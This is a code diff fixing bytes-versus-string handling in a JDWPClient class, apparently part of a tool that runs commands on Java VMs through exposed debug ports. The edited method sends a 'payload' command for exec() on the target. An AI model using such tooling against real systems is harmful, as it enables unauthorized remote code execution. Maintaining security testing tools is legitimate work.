@@ -596,18 +596,18 @@ class JDWPClient:
         field = self._parse_entries(buf, formats)[0]
         return field
 
-    def _create_string(self, data: bytes):
+    def _create_string(self, data: str):
         buf = self._build_string(data)
         self._socket.sendall(self._create_packet(CREATESTRING_SIG, data=buf))
         buf = self._read_reply()
         return self._parse_entries(buf, [(self.objectIDSize, "objId")], False)
 
-    def _build_string(self, data: bytes):
-        return struct.pack(">I", len(data)) + data
+    def _build_string(self, data: str):
+        return struct.pack(">I", len(data)) + data.encode('utf-8')
 
-    def _read_string(self, data):
+    def _read_string(self, data: bytes):
         size = struct.unpack(">I", data[:4])[0]
-        return data[4 : 4 + size]
+        return data[4 : 4 + size].decode('utf-8')
 
     def _suspend_vm(self):
         self._socket.sendall(self._create_packet(SUSPENDVM_SIG))
@@ -806,12 +806,12 @@ class JDWPClient:
             propObjId = propObjIds[0]["objId"]
 
             data = [
-                chr(TAG_OBJECT) + self._format(self.objectIDSize, propObjId),
+                struct.pack(">B", TAG_OBJECT) + self._format(self.objectIDSize, propObjId),
             ]
             buf = self._invoke_static(
                 systemClass["refTypeId"], threadId, getPropertyMeth["methodId"], *data
             )
-            if buf[0] != chr(TAG_STRING):
+            if buf[0] != TAG_STRING:
                 print(("[-] %s: Unexpected returned type: expecting String" % propStr))
             else:
                 retId = self._unformat(
@@ -845,8 +845,6 @@ class JDWPClient:
             bool: True if the command was successfully executed, False otherwise.
         """
         print(f"[+] Payload to send: '{command}'")
-
-        command = command.encode(encoding="utf-8")
 
         # Allocate string containing our command to exec()
         cmd_obj_ids = self._create_string(command)
